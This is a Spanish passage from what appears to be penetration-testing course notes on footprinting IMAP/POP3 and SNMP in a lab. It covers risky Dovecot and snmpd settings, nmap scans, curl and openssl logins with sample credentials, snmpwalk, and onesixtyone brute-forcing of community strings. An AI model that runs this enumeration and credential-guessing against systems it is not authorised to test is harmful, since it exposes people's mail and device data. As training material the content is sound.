SMTP se utiliza generalmente para enviar correos electrónicos. Al copiar correos electrónicos enviados en una carpeta IMAP, todos los clientes tienen acceso a todos los correos enviados, independientemente de la computadora desde la que fueron enviados. Otra ventaja del Protocolo de Acceso a Mensajes de Internet es la creación de carpetas personales y estructuras de carpetas en el buzón. Esta característica hace que el buzón sea más claro y fácil de administrar. Sin embargo, el requisito de espacio de almacenamiento en el servidor de correo electrónico aumenta.

Sin más medidas, IMAP funciona sin cifrar y transmite comandos, correos electrónicos o nombres de usuario y contraseñas en texto sin formato. Muchos servidores de correo electrónico requieren establecer una sesión IMAP cifrada para garantizar una mayor seguridad en el tráfico de correo electrónico y evitar el acceso no autorizado a los buzones. SSL/TLS se utiliza generalmente para este propósito. Dependiendo del método y la implementación utilizados, la conexión cifrada utiliza el puerto estándar `143` o un puerto alternativo como `993`.

---

## Configuración Predeterminada

Tanto IMAP como POP3 tienen una gran cantidad de opciones de configuración, lo que dificulta la inmersión profunda en cada componente con más detalle. Si desea examinar más a fondo estas configuraciones de protocolo, le recomendamos crear una VM localmente e instalar los dos paquetes `dovecot-imapd`, y `dovecot-pop3d` usando `apt` y jugar con las configuraciones y experimentar.

En la documentación de Dovecot, podemos encontrar al individuo [configuración central](https://doc.dovecot.org/settings/core/) y [configuración del servicio](https://doc.dovecot.org/configuration_manual/service_configuration/) opciones que pueden ser utilizadas para nuestros experimentos. Sin embargo, veamos la lista de comandos y veamos cómo podemos interactuar y comunicarnos directamente con IMAP y POP3 usando la línea de comandos.

#### Comandos IMAP

|**Comando**|**Descripción**|
|---|---|
|`1 LOGIN username password`|Inicio de sesión del usuario.|
|`1 LIST "" *`|Enumera todos los directorios.|
|`1 CREATE "INBOX"`|Crea un buzón con un nombre específico.|
|`1 DELETE "INBOX"`|Elimina un buzón.|
|`1 RENAME "ToRead" "Important"`|Renombra un buzón.|
|`1 LSUB "" *`|Devuelve un subconjunto de nombres del conjunto de nombres que el Usuario ha declarado como `active` o `subscribed`.|
|`1 SELECT INBOX`|Selecciona un buzón para que se pueda acceder a los mensajes en el buzón.|
|`1 UNSELECT INBOX`|Sale del buzón seleccionado.|
|`1 FETCH <ID> all`|Recupera datos asociados con un mensaje en el buzón.|
|`1 CLOSE`|Elimina todos los mensajes con el `Deleted` conjunto de bandera.|
|`1 LOGOUT`|Cierra la conexión con el servidor IMAP.|

#### Comandos POP3

|**Comando**|**Descripción**|
|---|---|
|`USER username`|Identifica al usuario.|
|`PASS password`|Autenticación del usuario utilizando su contraseña.|
|`STAT`|Solicita el número de correos electrónicos guardados del servidor.|
|`LIST`|Solicita al servidor el número y tamaño de todos los correos electrónicos.|
|`RETR id`|Solicita al servidor que entregue el correo electrónico solicitado por ID.|
|`DELE id`|Solicita al servidor que elimine el correo electrónico solicitado por ID.|
|`CAPA`|Solicita al servidor que muestre las capacidades del servidor.|
|`RSET`|Solicita al servidor que restablezca la información transmitida.|
|`QUIT`|Cierra la conexión con el servidor POP3.|

---

## Configuración Peligrosa

Sin embargo, las opciones de configuración que se configuraron incorrectamente podrían permitirnos obtener más información, como depurar los comandos ejecutados en el servicio o iniciar sesión como anónimos, similar al servicio FTP. La mayoría de las empresas utilizan proveedores de correo electrónico de terceros como Google, Microsoft y muchos otros. Sin embargo, algunas compañías todavía usan sus propios servidores de correo por muchas razones diferentes. Una de estas razones es mantener la privacidad que quieren mantener en sus propias manos. Los administradores pueden cometer muchos errores de configuración, lo que en el peor de los casos nos permitirá leer todos los correos electrónicos enviados y recibidos, que incluso pueden contener información confidencial o confidencial. Algunas de estas opciones de configuración incluyen:

|**Configuración**|**Descripción**|
|---|---|
|`auth_debug`|Habilita todo el registro de depuración de autenticación.|
|`auth_debug_passwords`|Esta configuración ajusta la verbosidad del registro, las contraseñas enviadas y el esquema se registra.|
|`auth_verbose`|Registra los intentos de autenticación fallidos y sus razones.|
|`auth_verbose_passwords`|Las contraseñas utilizadas para la autenticación se registran y también se pueden truncar.|
|`auth_anonymous_username`|Esto especifica el nombre de usuario que se utilizará al iniciar sesión con el mecanismo ANONYMOUS SASL.|

---

## Huella del Servicio

Por defecto, puertos `110` y `995` se utilizan para POP3 y puertos `143` y `993` se utilizan para IMAP. Los puertos más altos (`993` y `995`) use TLS/SSL para cifrar la comunicación entre el cliente y el servidor. Usando Nmap, podemos escanear el servidor en busca de estos puertos. El escaneo devolverá la información correspondiente (como se ve a continuación) si el servidor utiliza un certificado incrustado.

#### Mapa

  IMAP/POP3

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00026s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

Por ejemplo, a partir de la salida, podemos ver que el nombre común es `mail1.inlanefreight.htb`y el servidor de correo electrónico pertenece a la organización `Inlanefreight`, que se encuentra en California. Las capacidades mostradas nos muestran los comandos disponibles en el servidor y para el servicio en el puerto correspondiente.

Si averiguamos con éxito las credenciales de acceso para uno de los empleados, un atacante podría iniciar sesión en el servidor de correo y leer o incluso enviar los mensajes individuales.

#### CURL

  IMAP/POP3

```shell-session
vcrdcr@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
```

Si también usamos el `verbose` (`-v`) opción, veremos cómo se realiza la conexión. A partir de esto, podemos ver la versión de TLS utilizada para el cifrado, más detalles del certificado SSL e incluso el banner, que a menudo contendrá la versión del servidor de correo.

  IMAP/POP3

```shell-session
vcrdcr@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

*   Trying 10.129.14.128:993...
* TCP_NODELAY set
* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  start date: Sep 19 19:44:58 2021 GMT
*  expire date: Jul  4 19:44:58 2295 GMT
*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." Important
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.001 + 0.000 secs).
* Connection #0 to host 10.129.14.128 left intact
```

Para interactuar con el servidor IMAP o POP3 a través de SSL, podemos utilizar `openssl`, así como `ncat`. Los comandos para esto se verían así:

#### OpenSSL - Interacción cifrada TLS POP3

  IMAP/POP3

```shell-session
vcrdcr@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2
    Session-ID-ctx:
    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.
    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.
    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.
    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m
    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..
    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m<.F\.e....^
    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8
    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......>.*....
    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$
    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...
    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.
    00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\(..6.}*.

    Start Time: 1632081313
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
+OK HTB-Academy POP3 Server
```

#### OpenSSL - TLS Interacción cifrada IMAP

  IMAP/POP3

```shell-session
vcrdcr@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699
    Session-ID-ctx:
    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$
    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&..J}
    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.
    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)
    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..
    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..
    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....
    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..
    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.
    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!
    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}
    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb

    Start Time: 1632081604
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
```

Una vez que hayamos iniciado con éxito una conexión e iniciado sesión en el servidor de correo de destino, podemos usar los comandos anteriores para trabajar y navegar por el servidor. Queremos señalar que la configuración de nuestro propio servidor de correo, la investigación para ello y los experimentos que podemos hacer junto con otros miembros de la comunidad nos darán el conocimiento para comprender la comunicación que se está llevando a cabo y qué opciones de configuración son responsables de esto.

En la sección SMTP, hemos encontrado al usuario `robin`. Otro miembro de nuestro equipo pudo descubrir que el usuario también usa su nombre de usuario como contraseña (`robin`:`robin`). Podemos usar estas credenciales y probarlas para interactuar con los servicios IMAP/POP3.


# SNMP

---

`Simple Network Management Protocol` ([SNMP](https://datatracker.ietf.org/doc/html/rfc1157)) fue creado para monitorear dispositivos de red. Además, este protocolo también se puede utilizar para manejar tareas de configuración y cambiar la configuración de forma remota. El hardware habilitado para SNMP incluye enrutadores, conmutadores, servidores, dispositivos IoT y muchos otros dispositivos que también se pueden consultar y controlar mediante este protocolo estándar. Por lo tanto, es un protocolo para monitorear y administrar dispositivos de red. Además, las tareas de configuración se pueden manejar y la configuración se puede realizar de forma remota utilizando este estándar. La versión actual es `SNMPv3`, lo que aumenta la seguridad de SNMP en particular, pero también la complejidad de usar este protocolo.

Además del intercambio puro de información, SNMP también transmite comandos de control utilizando agentes a través del puerto UDP `161`. El cliente puede establecer valores específicos en el dispositivo y cambiar las opciones y configuraciones con estos comandos. Mientras que en la comunicación clásica, siempre es el cliente quien solicita activamente información del servidor, SNMP también permite el uso de los llamados `traps` sobre el puerto UDP `162`. Estos son paquetes de datos enviados desde el servidor SNMP al cliente sin ser solicitados explícitamente. Si un dispositivo está configurado en consecuencia, se envía una trampa SNMP al cliente una vez que ocurre un evento específico en el lado del servidor.

Para que el cliente y el servidor SNMP intercambien los valores respectivos, los objetos SNMP disponibles deben tener direcciones únicas conocidas en ambos lados. Este mecanismo de direccionamiento es un requisito previo absoluto para transmitir con éxito datos y monitoreo de red utilizando SNMP.

#### MIB

Para garantizar que el acceso SNMP funcione en todos los fabricantes y con diferentes combinaciones cliente-servidor, el `Management Information Base` (`MIB`) fue creado. MIB es un formato independiente para almacenar información del dispositivo. Un MIB es un archivo de texto en el que todos los objetos SNMP consultables de un dispositivo se enumeran en una jerarquía de árbol estandarizada. Contiene al menos uno `Object Identifier` (`OID`), que, además de la dirección única necesaria y un nombre, también proporciona información sobre el tipo, los derechos de acceso y una descripción del objeto respectivo. Los archivos MIB están escritos en el `Abstract Syntax Notation One` (`ASN.1`) formato de texto ASCII basado. Los MIB no contienen datos, pero explican dónde encontrar qué información y cómo se ve, qué devuelve valores para el OID específico o qué tipo de datos se utiliza.

#### OID

Un OID representa un nodo en un espacio de nombres jerárquico. Una secuencia de números identifica de forma única cada nodo, permitiendo determinar la posición del nodo en el árbol. Cuanto más larga es la cadena, más específica es la información. Muchos nodos en el árbol OID no contienen nada excepto referencias a los que están debajo de ellos. Los OID consisten en números enteros y generalmente se concatenan por notación de puntos. Podemos buscar muchos MIB para los OID asociados en el [Registro de Identificador de Objetos](https://www.alvestrand.no/objectid/).

#### SNMPv1

SNMP versión 1 (`SNMPv1`) se utiliza para la gestión y supervisión de la red. SNMPv1 es la primera versión del protocolo y todavía está en uso en muchas redes pequeñas. Admite la recuperación de información de dispositivos de red, permite la configuración de dispositivos y proporciona trampas, que son notificaciones de eventos. Sin embargo, SNMPv1 tiene `no built-in authentication` mecanismo, lo que significa que cualquier persona que acceda a la red puede leer y modificar los datos de la red. Otro defecto principal de SNMPv1 es que `does not support encryption`, lo que significa que todos los datos se envían en texto sin formato y se pueden interceptar fácilmente.

#### SNMPv2

SNMPv2 existía en diferentes versiones. La versión que todavía existe hoy es `v2c`, y la extensión `c` significa SNMP basado en la comunidad. En cuanto a la seguridad, SNMPv2 está a la par con SNMPv1 y se ha ampliado con funciones adicionales del SNMP basado en partes que ya no está en uso. Sin embargo, un problema significativo con la ejecución inicial del protocolo SNMP es que el `community string` eso proporciona seguridad solo se transmite en texto sin formato, lo que significa que no tiene cifrado incorporado.

#### SNMPv3

La seguridad se ha incrementado enormemente para `SNMPv3` por características de seguridad como `authentication` uso de nombre de usuario y contraseña y transmisión `encryption` (vía `pre-shared key`) de los datos. Sin embargo, la complejidad también aumenta en la misma medida, con significativamente más opciones de configuración que `v2c`.

#### Cuerdas Comunitarias

Las cadenas comunitarias pueden verse como contraseñas que se utilizan para determinar si la información solicitada se puede ver o no. Es importante tener en cuenta que muchas organizaciones todavía están utilizando `SNMPv2`, como la transición a `SNMPv3` puede ser muy complejo, pero los servicios aún deben permanecer activos. Esto causa a muchos administradores una gran preocupación y crea algunos problemas que desean evitar. La falta de conocimiento sobre cómo se puede obtener la información y cómo la usamos como atacantes hace que el enfoque de los administradores parezca inexplicable. Al mismo tiempo, la falta de cifrado de los datos enviados también es un problema. Porque cada vez que las cadenas de la comunidad se envían a través de la red, pueden ser interceptadas y leídas.

---

## Configuración Predeterminada

La configuración predeterminada del demonio SNMP define la configuración básica del servicio, que incluye las direcciones IP, puertos, MIB, OID, autenticación y cadenas de comunidad.

#### SNMP Configuración de Daemon

  SNMP

```shell-session
vcrdcr@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'

sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
sysServices    72
master  agentx
agentaddress  127.0.0.1,[::1]
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
```

La configuración de este servicio también se puede cambiar de muchas maneras. Por lo tanto, recomendamos configurar una VM para instalar y configurar el servidor SNMP nosotros mismos. Todas las configuraciones que se pueden hacer para el demonio SNMP se definen y describen en el [página de manual](http://www.net-snmp.org/docs/man/snmpd.conf.html).

---

## Configuración Peligrosa

Algunas configuraciones peligrosas que el administrador puede hacer con SNMP son:

|**Configuración**|**Descripción**|
|---|---|
|`rwuser noauth`|Proporciona acceso al árbol OID completo sin autenticación.|
|`rwcommunity <community string> <IPv4 address>`|Proporciona acceso al árbol OID completo independientemente de dónde se enviaron las solicitudes.|
|`rwcommunity6 <community string> <IPv6 address>`|El mismo acceso que con `rwcommunity` con la diferencia de usar IPv6.|

---

## Huella del Servicio

Para la huella de SNMP, podemos utilizar herramientas como `snmpwalk`, `onesixtyone`, y `braa`. `Snmpwalk` se utiliza para consultar los OID con su información. `Onesixtyone` se puede utilizar para forzar brutamente los nombres de las cadenas de la comunidad, ya que pueden ser nombrados arbitrariamente por el administrador. Dado que estas cadenas de comunidad se pueden vincular a cualquier fuente, identificar las cadenas de comunidad existentes puede llevar bastante tiempo.

#### SNMPwalk

  SNMP

```shell-session
vcrdcr@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128

iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34
iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 411
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

...SNIP...

iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: "printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: "procps_2:3.3.16-1ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: "proftpd-doc_1.3.6c-2_all"
iso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: "psmisc_23.3-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: "publicsuffix_20200303.0012-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: "pulseaudio_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: "pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: "pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: "python-apt-common_2.0.0ubuntu0.20.04.6_all"
iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: "python3-apport_2.20.11-0ubuntu27.21_all"
iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64" 

...SNIP...
```

En el caso de una configuración incorrecta, obtendríamos aproximadamente los mismos resultados de `snmpwalk` como se muestra arriba. Una vez que conocemos la cadena de comunidad y el servicio SNMP que no requiere autenticación (versiones 1, 2c), podemos consultar información interna del sistema como en el ejemplo anterior.

Aquí reconocemos algunos paquetes de Python que se han instalado en el sistema. Si no conocemos la cadena de la comunidad, podemos usar `onesixtyone` y `SecLists` listas de palabras para identificar estas cadenas comunitarias.

#### OneSixtyOne

  SNMP

```shell-session
vcrdcr@htb[/htb]$ sudo apt install onesixtyone
vcrdcr@htb[/htb]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64
```

